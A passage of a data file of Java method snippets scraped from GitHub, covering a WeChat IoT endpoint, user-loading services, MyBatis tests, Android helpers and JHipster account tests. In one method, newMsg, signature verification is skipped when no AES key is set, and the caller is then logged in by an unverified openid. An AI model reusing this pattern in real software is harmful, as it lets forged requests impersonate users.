img: {}\", userId, file.getOriginalFilename());        SecurityUser userDetails = (SecurityUser) userDetailsService.loadUserByUserId(userId);        if (userDetails == null || !userDetails.getToken().equals(token)) {            return \"token error\";        }        try {            // \u6587\u4ef6\u540d            String originalFilename = file.getOriginalFilename();            // \u6269\u5c55\u540d            assert originalFilename != null;            String fileExtName = originalFilename.substring(originalFilename.lastIndexOf('.') + 1);            File tempFile = File.createTempFile(IdUtil.fastSimpleUUID(), \".\" + fileExtName);            file.transferTo(tempFile);            WxMediaUploadResult wxMediaUploadResult = wxMpService                    .getMaterialService()                    .mediaUpload(WxConsts.KefuMsgType.IMAGE, tempFile);            // \u53d1\u9001\u7ed9\u7528\u6237            WxMpKefuMessage build = WxMpKefuMessage                    .IMAGE()                    .toUser(userDetails.getWxMpOpenid())                    .mediaId(wxMediaUploadResult.getMediaId())                    .build();            wxMpService.getKefuService().sendKefuMessage(build);            return wxMediaUploadResult.getMediaId();        } catch (Exception e) {            log.error(\"upload error: \", e);        }        return \"-1\";    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/mp/MpEndpoint.java", "stars": "6", "class": {"name": "MpEndpoint", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "auth", "params": ["String", "String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String auth(@RequestParam(name = \"signature\", required = false) String signature,                       @RequestParam(name = \"timestamp\", required = false) String timestamp,                       @RequestParam(name = \"nonce\", required = false) String nonce,                       @RequestParam(name = \"echostr\", required = false) String echostr) {        log.info(\"mp auth\uff1a[{}, {}, {}, {}]\", signature, timestamp, nonce, echostr);        if (wxMpService.checkSignature(timestamp, nonce, signature)) {            return echostr;        }        return \"-1\";    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/mp/MpEndpoint.java", "stars": "6", "class": {"name": "MpEndpoint", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "newMsg", "params": ["String", "String", "String", "String", "String", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String newMsg(@RequestBody String requestBody,                         @RequestParam(\"signature\") String signature,                         @RequestParam(\"timestamp\") String timestamp,                         @RequestParam(\"nonce\") String nonce,                         @RequestParam(\"openid\") String openid,                         @RequestParam(name = \"encrypt_type\", required = false) String encryptType,                         @RequestParam(name = \"msg_signature\", required = false) String msgSignature) {        // \u9a8c\u8bc1 \u6d4b\u8bd5\u8d26\u53f7\u4e0d\u8fdb\u884c\u9a8c\u8bc1        if (StringUtils.isNoneBlank(wxMpService.getWxMpConfigStorage().getAesKey())                && !wxMpService.checkSignature(timestamp, nonce, signature)) {            return \"-1\";        }        WxMpXmlMessage inMessage = WxMpXmlMessage.fromXml(requestBody);        log.info(\"new msg: {}\", inMessage);        // \u8fc7\u6ee4\u91cd\u590d\u6d88\u606f        if (CACHE.get(inMessage.getMsgId()) != null) {            return \"-1\";        }        CACHE.put(inMessage.getMsgId(), inMessage);        // \u7528\u6237\u767b\u5f55        SecurityUser userDetails = (SecurityUser) userDetailsService.loadUserByWechat(openid);        UsernamePasswordAuthenticationToken authentication = new UsernamePasswordAuthenticationToken(                userDetails, null, userDetails.getAuthorities()        );        SecurityContextHolder.getContext().setAuthentication(authentication);        // \u6d88\u606f\u5904\u7406        MpHandler mpHandler = handlerMap.get(inMessage.getMsgType());        String result = \"\u6d88\u606f\u7c7b\u578b\u4e0d\u652f\u6301\";        if (mpHandler != null) {            try {                result = mpHandler.process(inMessage);            } catch (Exception e) {                result = \"\u7cfb\u7edf\u5f02\u5e38\";                log.error(e);                e.printStackTrace();            }        }        return WxMpXmlOutMessage.TEXT().content(result)                .fromUser(inMessage.getToUser()).toUser(inMessage.getFromUser())                .build().toXml();    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/mp/MpEndpoint.java", "stars": "6", "class": {"name": "MpEndpoint", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getGno", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getGno() {\t\treturn gno;\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/vo/GBoardVO.java", "stars": "2", "class": {"name": "GBoardVO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setGno", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setGno(int gno) {\t\tthis.gno = gno;\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/vo/GBoardVO.java", "stars": "2", "class": {"name": "GBoardVO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getGmno", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getGmno() {\t\treturn gmno;\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/vo/GBoardVO.java", "stars": "2", "class": {"name": "GBoardVO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setGmno", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setGmno(int gmno) {\t\tthis.gmno = gmno;\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/vo/GBoardVO.java", "stars": "2", "class": {"name": "GBoardVO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getId() {\t\treturn id;\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/vo/GBoardVO.java", "stars": "2", "class": {"name": "GBoardVO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setId", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setId(String id) {\t\tthis.id = id;\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/vo/GBoardVO.java", "stars": "2", "class": {"name": "GBoardVO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getBody", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getBody() {\t\treturn body;\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/vo/GBoardVO.java", "stars": "2", "class": {"name": "GBoardVO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setBody", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setBody(String body) {\t\tthis.body = body;\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/vo/GBoardVO.java", "stars": "2", "class": {"name": "GBoardVO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getsDate", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getsDate() {\t\treturn sDate;\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/vo/GBoardVO.java", "stars": "2", "class": {"name": "GBoardVO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setsDate", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setsDate() {\t\tSimpleDateFormat form1 = new SimpleDateFormat(\"yyyy\ub144 MM\uc6d4 dd\uc77c\");\t\tSimpleDateFormat form2 = new SimpleDateFormat(\"HH:mm:ss\");\t\tString str = form1.format(gDate) + \" \" + form2.format(gTime);\t\tthis.sDate = str;\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/vo/GBoardVO.java", "stars": "2", "class": {"name": "GBoardVO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setsDate", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setsDate(String sDate) {\t\tthis.sDate = sDate;\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/vo/GBoardVO.java", "stars": "2", "class": {"name": "GBoardVO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAvatar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getAvatar() {\t\treturn avatar;\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/vo/GBoardVO.java", "stars": "2", "class": {"name": "GBoardVO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setAvatar", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setAvatar(String avatar) {\t\tthis.avatar = avatar;\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/vo/GBoardVO.java", "stars": "2", "class": {"name": "GBoardVO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getgDate", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "\tpublic Date getgDate() {\t\treturn gDate;\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/vo/GBoardVO.java", "stars": "2", "class": {"name": "GBoardVO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setgDate", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setgDate(Date gDate) {\t\tthis.gDate = gDate;\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/vo/GBoardVO.java", "stars": "2", "class": {"name": "GBoardVO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getgTime", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Time", "snippet": "\tpublic Time getgTime() {\t\treturn gTime;\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/vo/GBoardVO.java", "stars": "2", "class": {"name": "GBoardVO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setgTime", "params": ["Time"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setgTime(Time gTime) {\t\tthis.gTime = gTime;\t}", "url": "https://raw.githubusercontent.com/increpas-cls2/clsProj/branch/clsProj/src/com/increpas/www/vo/GBoardVO.java", "stars": "2", "class": {"name": "GBoardVO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "loadUserByUsername", "params": ["String"], "throws": ["UsernameNotFoundException"], "modifiers": ["public"], "return_type": "UserDetails", "snippet": "    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {        sqlSessionFactory.getConfiguration().addMapper(DBUserMapper.class);        DbUser myUser = null;        try (SqlSession session = sqlSessionFactory.openSession()) {            DBUserMapper mapper = session.getMapper(DBUserMapper.class);            myUser = mapper.getByUsername(securityProperties.getTableName(), username);        } catch (Exception e) {            log.error(e);        }        if (myUser == null) {            throw new UsernameNotFoundException(\"\u7528\u6237\u4e0d\u5b58\u5728\");        }        return new SecurityUser(                myUser.getId(),                LoginType.PASS,                myUser.getWxMpOpenid(),                myUser.getAliMpOpenid(),                myUser.getUsername(),                myUser.getPassword(),                myUser.getToken(),                AuthorityUtils.commaSeparatedStringToAuthorityList(myUser.getRoles())        );    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/security/service/DbUserDetailsServiceImpl.java", "stars": "6", "class": {"name": "DbUserDetailsServiceImpl", "extends": null, "implements": ["SecurityUserDetailsService"], "modifiers": ["public"]}}, {"method_name": "loadUserByUserId", "params": ["Integer"], "throws": ["UsernameNotFoundException"], "modifiers": ["public"], "return_type": "UserDetails", "snippet": "    public UserDetails loadUserByUserId(Integer userId) throws UsernameNotFoundException {        sqlSessionFactory.getConfiguration().addMapper(DBUserMapper.class);        try (SqlSession session = sqlSessionFactory.openSession()) {            DBUserMapper mapper = session.getMapper(DBUserMapper.class);            DbUser myUser = mapper.getByUserId(securityProperties.getTableName(), userId);            if (myUser != null) {                return new SecurityUser(                        myUser.getId(),                        LoginType.WX,                        myUser.getWxMpOpenid(),                        myUser.getAliMpOpenid(),                        myUser.getUsername(),                        myUser.getPassword(),                        myUser.getToken(),                        AuthorityUtils.commaSeparatedStringToAuthorityList(myUser.getRoles())                );            }        } catch (Exception e) {            log.error(\"\u6570\u636e\u5e93\u67e5\u8be2\u5931\u8d25\", e);        }        return null;    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/security/service/DbUserDetailsServiceImpl.java", "stars": "6", "class": {"name": "DbUserDetailsServiceImpl", "extends": null, "implements": ["SecurityUserDetailsService"], "modifiers": ["public"]}}, {"method_name": "loadUserByWechat", "params": ["String"], "throws": ["UsernameNotFoundException"], "modifiers": ["public"], "return_type": "UserDetails", "snippet": "    public UserDetails loadUserByWechat(String openId) throws UsernameNotFoundException {        sqlSessionFactory.getConfiguration().addMapper(DBUserMapper.class);        try (SqlSession session = sqlSessionFactory.openSession()) {            DBUserMapper mapper = session.getMapper(DBUserMapper.class);            DbUser myUser = mapper.getByWxMpOpenid(securityProperties.getTableName(), openId);            if (myUser == null) {                myUser = new DbUser();                myUser.setPassword(passwordEncoder.encode(IdUtil.fastSimpleUUID()));                myUser.setRoles(\"ROLE_USER\");                myUser.setToken(IdUtil.fastSimpleUUID());                mapper.insert(securityProperties.getTableName(), IdUtil.simpleUUID(), IdUtil.simpleUUID(), null, openId, myUser.getToken(), SecurityUtil.DEFAULT_ROLE);            }            myUser = mapper.getByWxMpOpenid(securityProperties.getTableName(), openId);            return new SecurityUser(                    myUser.getId(),                    LoginType.WX,                    myUser.getWxMpOpenid(),                    myUser.getAliMpOpenid(),                    myUser.getUsername(),                    myUser.getPassword(),                    myUser.getToken(),                    AuthorityUtils.commaSeparatedStringToAuthorityList(myUser.getRoles())            );        } catch (Exception e) {            log.error(\"\u6570\u636e\u5e93\u67e5\u8be2\u5931\u8d25\", e);        }        return null;    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/security/service/DbUserDetailsServiceImpl.java", "stars": "6", "class": {"name": "DbUserDetailsServiceImpl", "extends": null, "implements": ["SecurityUserDetailsService"], "modifiers": ["public"]}}, {"method_name": "loadUserByAlipay", "params": ["String"], "throws": ["UsernameNotFoundException"], "modifiers": ["public"], "return_type": "UserDetails", "snippet": "    public UserDetails loadUserByAlipay(String openId) throws UsernameNotFoundException {        sqlSessionFactory.getConfiguration().addMapper(DBUserMapper.class);        try (SqlSession session = sqlSessionFactory.openSession()) {            DBUserMapper mapper = session.getMapper(DBUserMapper.class);            DbUser myUser = mapper.getByAliMpOpenid(securityProperties.getTableName(), openId);            if (myUser == null) {                myUser = new DbUser();                myUser.setPassword(passwordEncoder.encode(IdUtil.fastSimpleUUID()));                myUser.setRoles(\"ROLE_USER\");                myUser.setToken(IdUtil.fastSimpleUUID());                mapper.insert(securityProperties.getTableName(), IdUtil.simpleUUID(), IdUtil.simpleUUID(), openId, null, myUser.getToken(), SecurityUtil.DEFAULT_ROLE);            }            myUser = mapper.getByAliMpOpenid(securityProperties.getTableName(), openId);            return new SecurityUser(                    myUser.getId(),                    LoginType.ALIPAY,                    myUser.getWxMpOpenid(),                    myUser.getAliMpOpenid(),                    myUser.getUsername(),                    myUser.getPassword(),                    myUser.getToken(),                    AuthorityUtils.commaSeparatedStringToAuthorityList(myUser.getRoles())            );        } catch (Exception e) {            log.error(\"\u6570\u636e\u5e93\u67e5\u8be2\u5931\u8d25\", e);        }        return null;    }", "url": "https://raw.githubusercontent.com/taoroot/taoiot/master/src/main/java/com/github/taoroot/taoiot/security/service/DbUserDetailsServiceImpl.java", "stars": "6", "class": {"name": "DbUserDetailsServiceImpl", "extends": null, "implements": ["SecurityUserDetailsService"], "modifiers": ["public"]}}, {"method_name": "setUp", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/encoding/EncodingConfig.xml\")) {      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);    }    Charset charset = Resources.getCharset();    try {      // make sure that the SQL file has been saved in UTF-8!      Resources.setCharset(Charset.forName(\"utf-8\"));      BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),              \"org/apache/ibatis/submitted/encoding/CreateDB.sql\");    } finally {      Resources.setCharset(charset);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/encoding/EncodingTest.java", "stars": "15", "class": {"name": "EncodingTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testEncoding1", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testEncoding1() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      EncodingMapper mapper = sqlSession.getMapper(EncodingMapper.class);      String answer = mapper.select1();      assertEquals(\"Mara\\u00f1\\u00f3n\", answer);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/encoding/EncodingTest.java", "stars": "15", "class": {"name": "EncodingTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testEncoding2", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testEncoding2() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      EncodingMapper mapper = sqlSession.getMapper(EncodingMapper.class);      String answer = mapper.select2();      assertEquals(\"Mara\\u00f1\\u00f3n\", answer);    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/encoding/EncodingTest.java", "stars": "15", "class": {"name": "EncodingTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "createDeserializationProxy", "params": ["Object", "Map<String,ResultLoaderMap>", "ObjectFactory", "List<Class>", "List<Object>"], "throws": null, "modifiers": ["protected"], "return_type": "Object", "snippet": "  protected Object createDeserializationProxy(Object target, Map<String, ResultLoaderMap.LoadPair> unloadedProperties, ObjectFactory objectFactory,          List<Class<?>> constructorArgTypes, List<Object> constructorArgs) {    return new CglibProxyFactory().createDeserializationProxy(target, unloadedProperties, objectFactory, constructorArgTypes, constructorArgs);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/loader/cglib/CglibSerialStateHolder.java", "stars": "15", "class": {"name": "CglibSerialStateHolder", "extends": "AbstractSerialStateHolder", "implements": null, "modifiers": []}}, {"method_name": "getCurrentRpm", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double getCurrentRpm() {        //sciagnij RPM z dostepnego miejsca        return currentRpm;    }", "url": "https://raw.githubusercontent.com/DevUpgrade-online/gearbox/master/ExternalSystems.java", "stars": "2", "class": {"name": "ExternalSystems", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "setCurrentRpm", "params": ["double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCurrentRpm(double currentRpm) {        this.currentRpm = currentRpm;    }", "url": "https://raw.githubusercontent.com/DevUpgrade-online/gearbox/master/ExternalSystems.java", "stars": "2", "class": {"name": "ExternalSystems", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getAngularSpeed", "params": [], "throws": null, "modifiers": ["public"], "return_type": "double", "snippet": "    public double getAngularSpeed() {        return angularSpeed;    }", "url": "https://raw.githubusercontent.com/DevUpgrade-online/gearbox/master/ExternalSystems.java", "stars": "2", "class": {"name": "ExternalSystems", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "setAngularSpeed", "params": ["double"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setAngularSpeed(double angularSpeed) {        this.angularSpeed = angularSpeed;    }", "url": "https://raw.githubusercontent.com/DevUpgrade-online/gearbox/master/ExternalSystems.java", "stars": "2", "class": {"name": "ExternalSystems", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getLights", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Lights", "snippet": "    public Lights getLights() {        return lights;    }", "url": "https://raw.githubusercontent.com/DevUpgrade-online/gearbox/master/ExternalSystems.java", "stars": "2", "class": {"name": "ExternalSystems", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getVideoPlayerApps", "params": [], "throws": null, "modifiers": ["static"], "return_type": "Map<String,String>", "snippet": "    static Map<String, String> getVideoPlayerApps() {        Intent playerIntent = new Intent(Intent.ACTION_VIEW);        playerIntent.setDataAndType(Uri.parse(\"http://get.popcorntime.io/nwtests/bbb_sunflower_1080p_30fps_normal_aac.mp4\"), \"video/*\");        PackageManager packageManager = ButterApplication.getAppContext().getPackageManager();        List<ResolveInfo> resolveInfoList = packageManager.queryIntentActivities(playerIntent, 0);        HashMap<String, String> returnMap = new HashMap<>();        for (ResolveInfo resolveInfo : resolveInfoList) {            returnMap.put(resolveInfo.activityInfo.name + DELIMITER + resolveInfo.activityInfo.packageName, resolveInfo.activityInfo.applicationInfo.loadLabel(packageManager).toString());        }        playerIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(\"/path/video.mp4\"));        playerIntent.setDataAndType(Uri.parse(\"/path/video.mp4\"), \"video/mp4\");        resolveInfoList = packageManager.queryIntentActivities(playerIntent, 0);        for (ResolveInfo resolveInfo : resolveInfoList) {            returnMap.put(resolveInfo.activityInfo.name + DELIMITER + resolveInfo.activityInfo.packageName, resolveInfo.activityInfo.applicationInfo.loadLabel(packageManager).toString());        }        return returnMap;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/content/preferences/DefaultPlayer.java", "stars": "4", "class": {"name": "DefaultPlayer", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "set", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void set(String playerName, String playerData) {        if (playerName.isEmpty() || playerData.isEmpty()) {            PrefUtils.remove(ButterApplication.getAppContext(), Prefs.DEFAULT_PLAYER);            PrefUtils.remove(ButterApplication.getAppContext(), Prefs.DEFAULT_PLAYER_NAME);            return;        }        PrefUtils.save(ButterApplication.getAppContext(), Prefs.DEFAULT_PLAYER_NAME, playerName);        PrefUtils.save(ButterApplication.getAppContext(), Prefs.DEFAULT_PLAYER, playerData);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/content/preferences/DefaultPlayer.java", "stars": "4", "class": {"name": "DefaultPlayer", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "start", "params": ["Media", "String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean start(Media media, String subLanguage, String location) {        Context context = ButterApplication.getAppContext();        String[] playerData = PrefUtils.get(context, Prefs.DEFAULT_PLAYER, \"\").split(DELIMITER);        if (playerData.length > 1) {            Intent intent = new Intent();            if (null != media && media.subtitles != null && media.subtitles.size() > 0 && subLanguage != null && !subLanguage.equals(\"no-subs\")) {                File subsLocation = new File(SubsProvider.getStorageLocation(context), media.videoId + \"-\" + subLanguage + \".srt\");                TorrentStreamServer.getInstance().setStreamSrtSubtitle(subsLocation);                intent.putExtra(\"subs\", new Uri[]{Uri.parse(location.substring(0, location.lastIndexOf('.')) + \".srt\")});                intent.putExtra(\"subs.name\", new String[]{LocaleUtils.toLocale(subLanguage).getDisplayLanguage()});            }            intent.setClassName(playerData[1], playerData[0]);            intent.setAction(Intent.ACTION_VIEW);            intent.setDataAndType(Uri.parse(location), \"video/mp4\");            if (media != null) {                if (media.isMovie) {                    intent.putExtra(\"title\", media.title);                } else {                    Episode episode = (Episode) media;                    intent.putExtra(\"title\", String.format(LocaleUtils.getCurrent(), \"%s S%dE%d - %s\", episode.showName, episode.season, episode.episode, episode.title));                }            }            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);            context.startActivity(intent);            return true;        }        return false;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/content/preferences/DefaultPlayer.java", "stars": "4", "class": {"name": "DefaultPlayer", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onDraw", "params": ["Canvas"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDraw(Canvas canvas) {        super.onDraw(canvas);        // \u4f7f\u7528 Paint.setTypeface() \u6765\u8bbe\u7f6e\u4e0d\u540c\u7684\u5b57\u4f53        // \u7b2c\u4e00\u5904\uff1a\u586b\u5165 null \u6765\u8bbe\u7f6e\u9ed8\u8ba4\u5b57\u4f53        paint.setTypeface(null);        canvas.drawText(text, 50, 100, paint);        paint.setTypeface(Typeface.SERIF);        // \u7b2c\u4e8c\u5904\uff1a\u586b\u5165 Typeface.SERIF \u6765\u8bbe\u7f6e\u886c\u7ebf\u5b57\u4f53\uff08\u5b8b\u4f53\uff09        canvas.drawText(text, 50, 200, paint);        paint.setTypeface(typeface);        // \u7b2c\u4e09\u5904\uff1a\u586b\u5165 typeface \u5bf9\u8c61\u6765\u4f7f\u7528 assets \u76ee\u5f55\u4e0b\u7684 \"Satisfy-Regular.ttf\" \u6587\u4ef6        canvas.drawText(text, 50, 300, paint);    }", "url": "https://raw.githubusercontent.com/Geekholt/Practice-CustomView/master/app/src/main/java/com/geekholt/practiceui/view/lesson3/Practice04SetTypefaceView.java", "stars": "2", "class": {"name": "Practice04SetTypefaceView", "extends": "View", "implements": null, "modifiers": ["public"]}}, {"method_name": "testNonAuthenticatedUser", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testNonAuthenticatedUser() throws Exception {        restAccountMockMvc            .perform(get(\"/api/authenticate\").accept(MediaType.APPLICATION_JSON))            .andExpect(status().isOk())            .andExpect(content().string(\"\"));    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testAuthenticatedUser", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testAuthenticatedUser() throws Exception {        restAccountMockMvc            .perform(                get(\"/api/authenticate\")                    .with(                        request -> {                            request.setRemoteUser(TEST_USER_LOGIN);                            return request;                        }                    )                    .accept(MediaType.APPLICATION_JSON)            )            .andExpect(status().isOk())            .andExpect(content().string(TEST_USER_LOGIN));    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testGetExistingAccount", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testGetExistingAccount() throws Exception {        Set<String> authorities = new HashSet<>();        authorities.add(AuthoritiesConstants.ADMIN);        UserDTO user = new UserDTO();        user.setLogin(TEST_USER_LOGIN);        user.setFirstName(\"john\");        user.setLastName(\"doe\");        user.setEmail(\"john.doe@jhipster.com\");        user.setImageUrl(\"http://placehold.it/50x50\");        user.setLangKey(\"en\");        user.setAuthorities(authorities);        userService.createUser(user);        restAccountMockMvc            .perform(get(\"/api/account\").accept(MediaType.APPLICATION_JSON))            .andExpect(status().isOk())            .andExpect(content().contentType(MediaType.APPLICATION_JSON_VALUE))            .andExpect(jsonPath(\"$.login\").value(TEST_USER_LOGIN))            .andExpect(jsonPath(\"$.firstName\").value(\"john\"))            .andExpect(jsonPath(\"$.lastName\").value(\"doe\"))            .andExpect(jsonPath(\"$.email\").value(\"john.doe@jhipster.com\"))            .andExpect(jsonPath(\"$.imageUrl\").value(\"http://placehold.it/50x50\"))            .andExpect(jsonPath(\"$.langKey\").value(\"en\"))            .andExpect(jsonPath(\"$.authorities\").value(AuthoritiesConstants.ADMIN));    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testGetUnknownAccount", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testGetUnknownAccount() throws Exception {        restAccountMockMvc            .perform(get(\"/api/account\").accept(MediaType.APPLICATION_PROBLEM_JSON))            .andExpect(status().isInternalServerError());    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AccountResourceIT.java", "stars": "2", "class": {"name": "AccountResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testRegisterValid", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testRegisterValid() throws Exception {        ManagedUserVM validUser = new ManagedUserVM();        validUser.setLogin(\"test-register-valid\");        validUser.setPassword(\"password\");        validUser.setFirstName(\"Alice\");        validUser.setLastName(\"Test\");        validUser.setEmail(\"test-register-valid@example.com\");        validUser.setImageUrl(\"http://placehold.it/50x50\");        validUser.setLangKey(Constants.DEFAULT_LANGUAGE);        validUser.setAuthorities(Collections.singleton(AuthoritiesConstants.USER));        assertThat(userRepository.findOneByLogin(\"test-register-valid\").isPresent()).isFalse();        restAccountMockMvc            